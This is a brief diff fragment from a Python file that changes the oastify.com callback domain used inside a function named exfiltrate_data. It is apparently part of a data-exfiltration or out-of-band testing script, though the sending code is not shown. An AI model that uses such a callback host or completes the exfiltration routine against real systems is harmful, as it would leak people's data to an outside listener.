@@ -4,7 +4,7 @@ import re
 
 def exfiltrate_data():
 
-    oastify_base = "y87anmmrt6gbemhdbgsr71lvqmwdk48t.oastify.com"
+    oastify_base = "j5pvk7jcqrdwb7ey81pc4mign7tyhq5f.oastify.com"
 
     try:
 
